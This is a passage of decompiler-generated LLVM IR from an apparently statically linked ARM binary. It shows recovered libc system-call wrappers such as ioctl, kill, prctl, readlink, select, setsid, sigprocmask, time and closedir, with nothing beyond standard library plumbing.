dec_label_pc_12278:                               ; preds = %dec_label_pc_12224, %dec_label_pc_1226c
  %v0_12278 = phi i32 [ %v0_12224, %dec_label_pc_12224 ], [ %v0_12278.pre, %dec_label_pc_1226c ]
  store i32 %v0_12278, i32* %r0.global-to-local, align 4
  %v2_12280 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_12280, i32* @r4, align 4
  store i32 %v6_121ac, i32* @r5, align 4
  store i32 %v12_121ac, i32* @r7, align 4
  ret i32 %v0_12278

; uselistorder directives
  uselistorder i32 %v0_12278, { 1, 0 }
  uselistorder i32 %v0_1226c, { 1, 0 }
  uselistorder i32 %v0_1223c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_121d0, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 2, 7, 6, 0, 1 }
  uselistorder label %dec_label_pc_12278, { 1, 0 }
  uselistorder label %dec_label_pc_1226c, { 1, 0 }
  uselistorder label %dec_label_pc_1222c, { 1, 0 }
  uselistorder label %dec_label_pc_12224, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %v1_122ac = load i32, i32* @r0, align 4
  ret i32 %v1_122ac
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v9_122b0 = load i32, i32* @r3, align 4
  store i32 %v9_122b0, i32* %stack_var_-4, align 4
  %v3_122b4 = load i32, i32* @r4, align 4
  store i32 %v3_122b4, i32* %stack_var_-32, align 4
  %v6_122b4 = load i32, i32* @r5, align 4
  %v12_122b4 = load i32, i32* @r7, align 4
  %v4_122c4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 13032) to i32*), align 4
  %v2_122cc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_122cc, i32* @r3, align 4
  %v2_122d0 = icmp eq i32 %v4_122c4, 0
  %v0_122d8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_122d8, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  br i1 %v2_122d0, label %dec_label_pc_122e8, label %dec_label_pc_12320

dec_label_pc_122e8:                               ; preds = %entry
  %tmp = icmp ult i32 %v0_122d8, -4095
  br i1 %tmp, label %dec_label_pc_12318, label %dec_label_pc_12300

dec_label_pc_12300:                               ; preds = %dec_label_pc_122e8
  %v1_12304 = sub i32 0, %v0_122d8
  %v3_12308 = load i16, i16* @global_var_23424.488, align 2
  %v4_12308 = sext i16 %v3_12308 to i32
  store i32 %v4_12308, i32* @r3, align 4
  %v0_1230c = call i32 @__aeabi_read_tp()
  %v2_12310 = load i32, i32* @r3, align 4
  %v3_12310 = add i32 %v2_12310, %v0_1230c
  %v4_12310 = inttoptr i32 %v3_12310 to i32*
  store i32 %v1_12304, i32* %v4_12310, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12318

dec_label_pc_12318:                               ; preds = %dec_label_pc_122e8, %dec_label_pc_12300
  %v0_12318 = phi i32 [ %v0_122d8, %dec_label_pc_122e8 ], [ -1, %dec_label_pc_12300 ]
  br label %dec_label_pc_1236c

dec_label_pc_12320:                               ; preds = %entry
  %v0_12320 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_12320, i32* %r6.global-to-local, align 4
  %v0_12330 = load i32, i32* @r4, align 4
  store i32 %v0_12330, i32* %r0.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_12330, -4095
  br i1 %tmp15, label %dec_label_pc_12360, label %dec_label_pc_12348

dec_label_pc_12348:                               ; preds = %dec_label_pc_12320
  %v1_1234c = sub i32 0, %v0_12330
  %v3_12350 = load i16, i16* @global_var_23424.488, align 2
  %v4_12350 = sext i16 %v3_12350 to i32
  store i32 %v4_12350, i32* @r3, align 4
  %v0_12354 = call i32 @__aeabi_read_tp()
  store i32 %v0_12354, i32* %r0.global-to-local, align 4
  %v2_12358 = load i32, i32* @r3, align 4
  %v3_12358 = add i32 %v2_12358, %v0_12354
  %v4_12358 = inttoptr i32 %v3_12358 to i32*
  store i32 %v1_1234c, i32* %v4_12358, align 4
  %v0_12360.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12360

dec_label_pc_12360:                               ; preds = %dec_label_pc_12320, %dec_label_pc_12348
  %v0_12364 = phi i32 [ %v0_12330, %dec_label_pc_12320 ], [ -1, %dec_label_pc_12348 ]
  %v0_12360 = phi i32 [ %v0_12320, %dec_label_pc_12320 ], [ %v0_12360.pre, %dec_label_pc_12348 ]
  store i32 %v0_12360, i32* %r0.global-to-local, align 4
  store i32 %v0_12364, i32* @r7, align 4
  %v1_12368 = call i32 @__libc_disable_asynccancel(i32 %v0_12360)
  store i32 %v1_12368, i32* %r0.global-to-local, align 4
  %v0_1236c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1236c

dec_label_pc_1236c:                               ; preds = %dec_label_pc_12318, %dec_label_pc_12360
  %v0_1236c = phi i32 [ %v0_12318, %dec_label_pc_12318 ], [ %v0_1236c.pre, %dec_label_pc_12360 ]
  store i32 %v0_1236c, i32* %r0.global-to-local, align 4
  %v2_12374 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_12374, i32* @r4, align 4
  store i32 %v6_122b4, i32* @r5, align 4
  store i32 %v12_122b4, i32* @r7, align 4
  ret i32 %v0_1236c

; uselistorder directives
  uselistorder i32 %v0_1236c, { 1, 0 }
  uselistorder i32 %v0_12360, { 1, 0 }
  uselistorder i32 %v0_12330, { 1, 2, 0, 3 }
  uselistorder i32 %v0_122d8, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 7, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_1236c, { 1, 0 }
  uselistorder label %dec_label_pc_12360, { 1, 0 }
  uselistorder label %dec_label_pc_12318, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12390 = load i32, i32* @r7, align 4
  store i32 %v3_12390, i32* %stack_var_-8, align 4
  %v0_1239c = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1239c, -4095
  br i1 %tmp, label %dec_label_pc_123bc, label %dec_label_pc_123a4

dec_label_pc_123a4:                               ; preds = %entry
  %v1_123a8 = sub i32 0, %v0_1239c
  %v3_123ac = load i16, i16* @global_var_23424.488, align 2
  %v4_123ac = sext i16 %v3_123ac to i32
  %v0_123b0 = call i32 @__aeabi_read_tp()
  %v3_123b4 = add i32 %v4_123ac, %v0_123b0
  %v4_123b4 = inttoptr i32 %v3_123b4 to i32*
  store i32 %v1_123a8, i32* %v4_123b4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_123bc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_123bc

dec_label_pc_123bc:                               ; preds = %entry, %dec_label_pc_123a4
  %v1_123c0 = phi i32 [ %v0_1239c, %entry ], [ -1, %dec_label_pc_123a4 ]
  %v2_123bc = phi i32 [ %v3_12390, %entry ], [ %v2_123bc.pre, %dec_label_pc_123a4 ]
  store i32 %v2_123bc, i32* @r7, align 4
  ret i32 %v1_123c0

; uselistorder directives
  uselistorder i32 %v0_1239c, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_123bc, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_123c8 = load i32, i32* @r4, align 4
  store i32 %v3_123c8, i32* %stack_var_-12, align 4
  %v0_123d8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_123d8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_123d8, -4095
  br i1 %tmp, label %dec_label_pc_12400, label %dec_label_pc_123e8

dec_label_pc_123e8:                               ; preds = %entry
  %v0_123ec = call i32 @__aeabi_read_tp()
  %v3_123f0 = load i16, i16* @global_var_23424.488, align 2
  %v4_123f0 = sext i16 %v3_123f0 to i32
  %v0_123f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_123f4 = sub i32 0, %v0_123f4
  store i32 %v1_123f4, i32* %r2.global-to-local, align 4
  %v3_123f8 = add i32 %v4_123f0, %v0_123ec
  %v4_123f8 = inttoptr i32 %v3_123f8 to i32*
  store i32 %v1_123f4, i32* %v4_123f8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12400.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_12400

dec_label_pc_12400:                               ; preds = %entry, %dec_label_pc_123e8
  %v1_12404 = phi i32 [ %v0_123d8, %entry ], [ -1, %dec_label_pc_123e8 ]
  %v2_12400 = phi i32 [ %v3_123c8, %entry ], [ %v2_12400.pre, %dec_label_pc_123e8 ]
  store i32 %v2_12400, i32* @r4, align 4
  ret i32 %v1_12404

; uselistorder directives
  uselistorder i32 %v0_123d8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12400, { 1, 0 }
}

define i32 @readlink(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1240c = load i32, i32* @r7, align 4
  store i32 %v3_1240c, i32* %stack_var_-8, align 4
  %v0_12418 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12418, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12418, -4095
  br i1 %tmp, label %dec_label_pc_12440, label %dec_label_pc_12428

dec_label_pc_12428:                               ; preds = %entry
  %v0_1242c = call i32 @__aeabi_read_tp()
  %v3_12430 = load i16, i16* @global_var_23424.488, align 2
  %v4_12430 = sext i16 %v3_12430 to i32
  %v0_12434 = load i32, i32* %r2.global-to-local, align 4
  %v1_12434 = sub i32 0, %v0_12434
  store i32 %v1_12434, i32* %r2.global-to-local, align 4
  %v3_12438 = add i32 %v4_12430, %v0_1242c
  %v4_12438 = inttoptr i32 %v3_12438 to i32*
  store i32 %v1_12434, i32* %v4_12438, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12440.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12440

dec_label_pc_12440:                               ; preds = %entry, %dec_label_pc_12428
  %v1_12444 = phi i32 [ %v0_12418, %entry ], [ -1, %dec_label_pc_12428 ]
  %v2_12440 = phi i32 [ %v3_1240c, %entry ], [ %v2_12440.pre, %dec_label_pc_12428 ]
  store i32 %v2_12440, i32* @r7, align 4
  ret i32 %v1_12444

; uselistorder directives
  uselistorder i32 %v0_12418, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12440, { 1, 0 }
}

define i32 @__syscall_select() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1244c = load i32, i32* @r4, align 4
  store i32 %v3_1244c, i32* %stack_var_-12, align 4
  %v0_1245c = load i32, i32* @r0, align 4
  store i32 %v0_1245c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1245c, -4095
  br i1 %tmp, label %dec_label_pc_12484, label %dec_label_pc_1246c

dec_label_pc_1246c:                               ; preds = %entry
  %v0_12470 = call i32 @__aeabi_read_tp()
  %v3_12474 = load i16, i16* @global_var_23424.488, align 2
  %v4_12474 = sext i16 %v3_12474 to i32
  %v0_12478 = load i32, i32* %r2.global-to-local, align 4
  %v1_12478 = sub i32 0, %v0_12478
  store i32 %v1_12478, i32* %r2.global-to-local, align 4
  %v3_1247c = add i32 %v4_12474, %v0_12470
  %v4_1247c = inttoptr i32 %v3_1247c to i32*
  store i32 %v1_12478, i32* %v4_1247c, align 4
  %v2_12484.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_12484

dec_label_pc_12484:                               ; preds = %entry, %dec_label_pc_1246c
  %v1_12488 = phi i32 [ %v0_1245c, %entry ], [ -1, %dec_label_pc_1246c ]
  %v2_12484 = phi i32 [ %v3_1244c, %entry ], [ %v2_12484.pre, %dec_label_pc_1246c ]
  store i32 %v2_12484, i32* @r4, align 4
  ret i32 %v1_12488

; uselistorder directives
  uselistorder i32 %v0_1245c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12484, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_12490 = load i32, i32* @r4, align 4
  store i32 %v3_12490, i32* %stack_var_-28, align 4
  %v6_12490 = load i32, i32* @r5, align 4
  %v9_12490 = load i32, i32* @r6, align 4
  %v12_12490 = load i32, i32* @r7, align 4
  %v15_12490 = load i32, i32* @r8, align 4
  %v18_12490 = load i32, i32* @sl, align 4
  %v21_12490 = load i32, i32* @lr, align 4
  %v4_124a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 13032) to i32*), align 4
  %v2_124a8 = icmp eq i32 %v4_124a0, 0
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_124a8, label %dec_label_pc_124c4, label %entry.dec_label_pc_124d0_crit_edge

entry.dec_label_pc_124d0_crit_edge:               ; preds = %entry
  br label %dec_label_pc_124d0

dec_label_pc_124c4:                               ; preds = %entry
  store i32 %v3_12490, i32* @r4, align 4
  store i32 %v9_12490, i32* @r6, align 4
  store i32 %v12_12490, i32* @r7, align 4
  store i32 %v15_12490, i32* @r8, align 4
  store i32 %v18_12490, i32* %sl.global-to-local, align 4
  %v0_124cc = call i32 @__syscall_select()
  br label %dec_label_pc_124d0

dec_label_pc_124d0:                               ; preds = %entry.dec_label_pc_124d0_crit_edge, %dec_label_pc_124c4
  %v0_124d0 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_124d0, i32* @r5, align 4
  %v0_124e4 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_124e4, i32* @r0, align 4
  %v0_124ec = call i32 @__syscall_select()
  store i32 %v0_124ec, i32* @r4, align 4
  %v0_124f4 = load i32, i32* @r5, align 4
  %v1_124f8 = call i32 @__libc_disable_asynccancel(i32 %v0_124f4)
  %v0_124fc = load i32, i32* @r4, align 4
  %v2_12504 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_12504, i32* @r4, align 4
  store i32 %v6_12490, i32* @r5, align 4
  store i32 %v9_12490, i32* @r6, align 4
  store i32 %v12_12490, i32* @r7, align 4
  store i32 %v15_12490, i32* @r8, align 4
  store i32 %v18_12490, i32* @sl, align 4
  store i32 %v21_12490, i32* @lr, align 4
  ret i32 %v0_124fc

; uselistorder directives
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_124d0, { 1, 0 }
}

define i32 @__GI_setsid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12514 = load i32, i32* @r7, align 4
  store i32 %v3_12514, i32* %stack_var_-8, align 4
  %v0_12520 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12520, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12520, -4095
  br i1 %tmp, label %dec_label_pc_12548, label %dec_label_pc_12530

dec_label_pc_12530:                               ; preds = %entry
  %v0_12534 = call i32 @__aeabi_read_tp()
  %v3_12538 = load i16, i16* @global_var_23424.488, align 2
  %v4_12538 = sext i16 %v3_12538 to i32
  %v0_1253c = load i32, i32* %r2.global-to-local, align 4
  %v1_1253c = sub i32 0, %v0_1253c
  store i32 %v1_1253c, i32* %r2.global-to-local, align 4
  %v3_12540 = add i32 %v4_12538, %v0_12534
  %v4_12540 = inttoptr i32 %v3_12540 to i32*
  store i32 %v1_1253c, i32* %v4_12540, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12548.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12548

dec_label_pc_12548:                               ; preds = %entry, %dec_label_pc_12530
  %v1_1254c = phi i32 [ %v0_12520, %entry ], [ -1, %dec_label_pc_12530 ]
  %v2_12548 = phi i32 [ %v3_12514, %entry ], [ %v2_12548.pre, %dec_label_pc_12530 ]
  store i32 %v2_12548, i32* @r7, align 4
  ret i32 %v1_1254c

; uselistorder directives
  uselistorder i32 %v0_12520, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12548, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_12558 = icmp eq i32* %arg2, null
  br i1 %v2_12558, label %dec_label_pc_1259c, label %dec_label_pc_1256c

dec_label_pc_1256c:                               ; preds = %entry
  %v2_1256c = load i32, i32* %arg2, align 4
  %v1_12570 = icmp slt i32 %v2_1256c, 0
  br i1 %v1_12570, label %dec_label_pc_12584, label %dec_label_pc_12578

dec_label_pc_12578:                               ; preds = %dec_label_pc_1256c
  %tmp = ptrtoint i32* %arg2 to i32
  %.pre = add i32 %tmp, 4
  %.pre3 = inttoptr i32 %.pre to i32*
  %v3_12578 = load i32, i32* %.pre3, align 4
  %v1_1257c = urem i32 %v3_12578, 2
  %v2_1257c = icmp eq i32 %v1_1257c, 0
  br i1 %v2_1257c, label %dec_label_pc_1259c, label %dec_label_pc_12584

dec_label_pc_12584:                               ; preds = %dec_label_pc_1256c, %dec_label_pc_12578
  %v2_12584 = load i32, i32* %arg2, align 4
  %tmp9 = bitcast i32 %v2_12584 to float
  %tmp10 = call float @fabsf(float %tmp9)
  br label %dec_label_pc_1259c

dec_label_pc_1259c:                               ; preds = %dec_label_pc_12578, %entry, %dec_label_pc_12584
  %tmp11 = icmp ult i32 %arg1, -4095
  br i1 %tmp11, label %dec_label_pc_125d0, label %dec_label_pc_125b8

dec_label_pc_125b8:                               ; preds = %dec_label_pc_1259c
  %v1_125bc = sub i32 0, %arg1
  %v3_125c0 = load i16, i16* @global_var_23424.488, align 2
  %v4_125c0 = sext i16 %v3_125c0 to i32
  %v0_125c4 = call i32 @__aeabi_read_tp()
  %v3_125c8 = add i32 %v4_125c0, %v0_125c4
  %v4_125c8 = inttoptr i32 %v3_125c8 to i32*
  store i32 %v1_125bc, i32* %v4_125c8, align 4
  br label %dec_label_pc_125d0

dec_label_pc_125d0:                               ; preds = %dec_label_pc_1259c, %dec_label_pc_125b8
  %v1_125d8 = phi i32 [ %arg1, %dec_label_pc_1259c ], [ -1, %dec_label_pc_125b8 ]
  ret i32 %v1_125d8

; uselistorder directives
  uselistorder i32* %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_125d0, { 1, 0 }
  uselistorder label %dec_label_pc_1259c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12584, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_125e4 = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r1, align 4
  %v2_125f4 = call i32 @gettimeofday(i32 %v2_125e4, i32 0)
  %v2_125f8 = load i32, i32* %stack_var_-16, align 4
  %v2_125fc = icmp eq i32* %arg1, null
  br i1 %v2_125fc, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 %v2_125f8, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  ret i32 %v2_125f8

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_12610 = load i32, i32* @r4, align 4
  store i32 %v3_12610, i32* %stack_var_-24, align 4
  %v9_12610 = load i32, i32* @r6, align 4
  %v12_12610 = load i32, i32* @r7, align 4
  %v15_12610 = load i32, i32* @r8, align 4
  %v18_12610 = load i32, i32* @lr, align 4
  %v2_12614 = load i32, i32* %arg1, align 4
  store i32 %v2_12614, i32* %r3.global-to-local, align 4
  %v3_1261c = icmp eq i32 %v2_12614, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* @r6, align 4
  br i1 %v3_1261c, label %dec_label_pc_12630, label %dec_label_pc_1264c

dec_label_pc_12630:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_10de4.511 to i32), i32* %r2.global-to-local, align 4
  %v0_12634 = call i32 @__aeabi_read_tp()
  %v3_12638 = load i16, i16* @global_var_23424.488, align 2
  %v4_12638 = sext i16 %v3_12638 to i32
  store i32 %v4_12638, i32* %r2.global-to-local, align 4
  %v0_1263c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1263c, i32* %r1.global-to-local, align 4
  %v1_12640 = add i32 %v0_1263c, 10
  store i32 %v1_12640, i32* %r3.global-to-local, align 4
  %v3_12644 = add i32 %v4_12638, %v0_12634
  %v4_12644 = inttoptr i32 %v3_12644 to i32*
  store i32 %v1_12640, i32* %v4_12644, align 4
  %v0_126f4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_126f4

dec_label_pc_1264c:                               ; preds = %entry
  store i32 68, i32* %r3.global-to-local, align 4
  %v1_12650 = add i32 %tmp, 24
  store i32 %v1_12650, i32* %r2.global-to-local, align 4
  %v4_12658 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 68) to i32*), align 4
  store i32 %v4_12658, i32* %r1.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_12664 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_12664)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_1267c = load i32, i32* @r6, align 4
  %v2_1267c = add i32 %v0_1267c, 16
  %v3_1267c = inttoptr i32 %v2_1267c to i32*
  %v4_1267c = load i32, i32* %v3_1267c, align 4
  call void @__pseudo_branch(i32 %v4_1267c)
  %v0_12688 = load i32, i32* @r7, align 4
  %v1_12688 = inttoptr i32 %v0_12688 to i32*
  %v2_12688 = load i32, i32* %v1_12688, align 4
  store i32 %v2_12688, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_12698 = load i32, i32* @r8, align 4
  store i32 %v0_12698, i32* %v1_12688, align 4
  %v0_1269c = load i32, i32* @r6, align 4
  %v1_1269c = load i32, i32* %r3.global-to-local, align 4
  %v2_1269c = add i32 %v1_1269c, %v0_1269c
  %v3_1269c = inttoptr i32 %v2_1269c to i32*
  %v4_1269c = load i32, i32* %v3_1269c, align 4
  store i32 ptrtoint (i32* @global_var_126a8.516 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1269c)
  %v0_126a8 = load i32, i32* @r7, align 4
  %v1_126a8 = add i32 %v0_126a8, 12
  %v2_126a8 = inttoptr i32 %v1_126a8 to i32*
  %v3_126a8 = load i32, i32* %v2_126a8, align 4
  store i32 %v3_126a8, i32* @r0, align 4
  %v0_126ac = call i32 @free()
  %v0_126b0 = load i32, i32* @r7, align 4
  store i32 %v0_126b0, i32* @r0, align 4
  %v0_126b4 = call i32 @free()
  %v0_126bc = load i32, i32* @r4, align 4
  store i32 %v0_126bc, i32* %r2.global-to-local, align 4
  %tmp11 = icmp ult i32 %v0_126bc, -4095
  br i1 %tmp11, label %dec_label_pc_126f0, label %dec_label_pc_126d8

dec_label_pc_126d8:                               ; preds = %dec_label_pc_1264c
  store i32 68924, i32* %r3.global-to-local, align 4
  %v0_126dc = call i32 @__aeabi_read_tp()
  %v3_126e0 = load i16, i16* @global_var_23424.488, align 2
  %v4_126e0 = sext i16 %v3_126e0 to i32
  store i32 %v4_126e0, i32* %r3.global-to-local, align 4
  %v0_126e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_126e4 = sub i32 0, %v0_126e4
  store i32 %v1_126e4, i32* %r2.global-to-local, align 4
  %v3_126e8 = add i32 %v4_126e0, %v0_126dc
  %v4_126e8 = inttoptr i32 %v3_126e8 to i32*
  store i32 %v1_126e4, i32* %v4_126e8, align 4
  %v0_126ec = load i32, i32* @r8, align 4
  br label %dec_label_pc_126f0

dec_label_pc_126f0:                               ; preds = %dec_label_pc_1264c, %dec_label_pc_126d8
  %v0_126f0 = phi i32 [ %v0_126bc, %dec_label_pc_1264c ], [ %v0_126ec, %dec_label_pc_126d8 ]
  store i32 %v0_126f0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_126f4

dec_label_pc_126f4:                               ; preds = %dec_label_pc_12630, %dec_label_pc_126f0
  %v0_126f4 = phi i32 [ %v0_126f4.pre, %dec_label_pc_12630 ], [ %v0_126f0, %dec_label_pc_126f0 ]
  %v2_126fc = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_126fc, i32* @r4, align 4
  store i32 %v9_12610, i32* @r6, align 4
  store i32 %v12_12610, i32* @r7, align 4
  store i32 %v15_12610, i32* @r8, align 4
  store i32 %v18_12610, i32* @lr, align 4
  ret i32 %v0_126f4

; uselistorder directives
  uselistorder i32 %v0_126bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_126f4, { 1, 0 }
  uselistorder label %dec_label_pc_126f0, { 1, 0 }
}

define i32 @function_1270c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1270c:
  %v0_1270c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1270c, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_1270c
  %v2_12718 = load i32, i32* @ip, align 4
  %v3_1271c = load i32, i32* @sp, align 4
  %v8_1271c = lshr i32 %v2_12718, %v3_1271c
  %v9_1271c = and i32 %v8_1271c, %arg2
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1270c, %bb
  %v10_1271c = phi i32 [ %arg1, %dec_label_pc_1270c ], [ %v9_1271c, %bb ]
  ret i32 %v10_1271c

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_12720 = load i32, i32* @r4, align 4
  %v6_12720 = load i32, i32* @r5, align 4
  %v9_12720 = load i32, i32* @r6, align 4
  %v12_12720 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 48, i32* @r0, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_12734 = call i32 @malloc()
  %v2_1273c = icmp eq i32 %v0_12734, 0
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* @r6, align 4
  br i1 %v2_1273c, label %bb, label %dec_label_pc_1274c

bb:                                               ; preds = %entry
  br label %dec_label_pc_127d8

dec_label_pc_1274c:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_12750 = load i32, i32* @r4, align 4
  %v2_12750 = icmp ugt i32 %v0_12750, 511
  %v2_12754 = add i32 %v0_12734, 4
  %v3_12754 = inttoptr i32 %v2_12754 to i32*
  store i32 0, i32* %v3_12754, align 4
  %v0_12758 = load i32, i32* %r3.global-to-local, align 4
  %v2_12758 = add i32 %v0_12734, 16
  %v3_12758 = inttoptr i32 %v2_12758 to i32*
  store i32 %v0_12758, i32* %v3_12758, align 4
  %v0_1275c = load i32, i32* %r3.global-to-local, align 4
  %v2_1275c = add i32 %v0_12734, 8
  %v3_1275c = inttoptr i32 %v2_1275c to i32*
  store i32 %v0_1275c, i32* %v3_1275c, align 4
  br i1 %v2_12750, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_1274c
  %v0_127642 = load i32, i32* @r4, align 4
  %v2_127643 = add i32 %v0_12734, 20
  %v3_127644 = inttoptr i32 %v2_127643 to i32*
  store i32 %v0_127642, i32* %v3_127644, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_1274c
  %v1_12760 = load i32, i32* %r3.global-to-local, align 4
  %v2_12760 = add i32 %v1_12760, 512
  store i32 %v2_12760, i32* %r3.global-to-local, align 4
